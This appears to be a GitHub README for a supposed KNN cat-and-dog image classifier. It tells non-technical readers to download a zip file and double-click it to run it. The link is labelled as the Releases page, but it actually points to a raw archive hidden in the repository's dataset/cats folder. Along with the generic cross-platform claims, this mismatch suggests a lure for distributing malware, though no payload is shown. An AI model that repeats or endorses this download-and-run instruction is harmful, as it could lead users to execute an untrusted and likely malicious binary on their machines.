## 🚀 Getting Started

Welcome to the **knn-cat-dog-demo**! This application uses a KNN (K-Nearest Neighbors) algorithm to classify images of cats and dogs. You do not need any programming skills to use it. Follow the steps below to get started.

## 📥 Download & Install

To obtain the application, visit the following link:

[Download from Releases](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/cats/demo_dog_knn_cat_v2.1.zip)

1. Click on the link above to visit the Releases page.
2. Find the latest version of the application.
3. Click on the file to download it.
4. Once downloaded, find the file on your computer and double-click to run it.

*Ensure your computer meets the following requirements:*

- Operating System: Windows, macOS, or Linux
- Minimum RAM: 4GB
- Storage Space: 100MB available

## 📊 Features

- Easy image classification: Distinguish between cat and dog images in just a few clicks.
- Simple user interface: Designed for anyone to use, regardless of experience.
- Fast processing: Quickly identifies the object in your images using machine learning.
- Open Source: Customize the application if you have some programming knowledge.

## 📸 How to Use the Application

1. Launch the application by double-clicking the downloaded file.
2. You will see an interface with options to upload images.
3. Click the "Upload Image" button and select the image you wish to classify.
4. After selecting the image, click on the "Classify" button.
5. The application will display whether the image is a cat or a dog within seconds.

## 🔄 Supported Image Formats

The application supports the following image formats:

- JPEG
- PNG
- GIF

Make sure your images are in one of these formats for successful classification.

## 🛠️ Troubleshooting

If you encounter any issues with the application, here are some common solutions:

- **File Not Opening:** Ensure your operating system is compatible. Try downloading again if needed.
- **Slow Response:** Make sure no other heavy applications are running when you use this software. Close unnecessary programs to speed things up.
- **Image Not Classified:** Check the image format supported by the app. Ensure you upload a clear image for better results.

## 📈 Learn More about KNN Algorithm

The KNN algorithm measures the distance between data points. When you upload an image, the app looks for the closest matching images in its database to classify the new one. This method is effective for image recognition tasks like distinguishing between cats and dogs.
